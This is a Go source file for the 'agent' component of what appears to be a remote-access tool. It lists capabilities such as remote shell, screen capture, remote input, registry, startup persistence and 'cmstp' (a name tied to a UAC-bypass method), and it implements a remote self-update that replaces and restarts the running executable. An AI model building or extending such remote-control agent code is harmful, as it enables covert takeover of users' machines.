//go:build agent
// +build agent

package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"strings"
	"time"

	"multifs-advanced/internal/protocol"
)

func fullAgentCapabilities() []string {
	return []string{
		"files_read", "files_write", "archive",
		"power", "fun", "messagebox", "screen", "remote_input",
		"processes", "registry", "shell", "startup", "logs",
		"cmstp", "agent_control", "remote_update",
	}
}

func (a *agent) opSelfUpdate(req *protocol.Request) {
	data, err := base64.StdEncoding.DecodeString(req.DataB64)
	if err != nil {
		a.replyErr(req.ID, "invalid update payload")
		return
	}
	expectedSHA := stringArg(req.Args, "sha256")
	currentExe, err := os.Executable()
	if err != nil {
		a.replyErr(req.ID, "cannot locate current executable")
		return
	}
	stage, actualSHA, err := writeVerifiedUpdateFile(currentExe, data, expectedSHA)
	if err != nil {
		a.replyErr(req.ID, err.Error())
		return
	}
	restart := boolArg(req.Args, "restart", true)
	result := map[string]any{
		"staged":         stage,
		"sha256":         actualSHA,
		"target_version": stringArg(req.Args, "target_version"),
		"restart":        restart,
	}
	if restart {
		if err := scheduleSelfReplaceAndRestart(currentExe, stage, os.Args[1:]); err != nil {
			_ = os.Remove(stage)
			a.replyErr(req.ID, fmt.Sprintf("failed to schedule replacement: %v", err))
			return
		}
		a.replyOK(req.ID, result)
		go func() {
			time.Sleep(350 * time.Millisecond)
			os.Exit(0)
		}()
		return
	}
	a.replyOK(req.ID, result)
}

func stringArg(args map[string]any, key string) string {
	if args == nil {
		return ""
	}
	if v, ok := args[key]; ok {
		switch t := v.(type) {
		case string:
			return strings.TrimSpace(t)
		case fmt.Stringer:
			return strings.TrimSpace(t.String())
		default:
			return strings.TrimSpace(fmt.Sprint(t))
		}
	}
	return ""
}

func boolArg(args map[string]any, key string, def bool) bool {
	if args == nil {
		return def
	}
	if v, ok := args[key]; ok {
		switch t := v.(type) {
		case bool:
			return t
		case string:
			t = strings.ToLower(strings.TrimSpace(t))
			return t == "1" || t == "true" || t == "yes"
		}
	}
	return def
}
